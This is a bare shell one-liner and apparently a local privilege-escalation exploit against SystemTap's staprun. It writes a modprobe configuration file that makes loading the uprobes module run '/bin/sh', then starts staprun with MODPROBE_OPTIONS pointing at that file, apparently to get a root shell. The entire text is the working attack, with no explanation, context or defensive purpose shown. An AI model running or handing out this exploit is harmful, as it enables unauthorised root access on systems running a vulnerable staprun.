printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u whatever
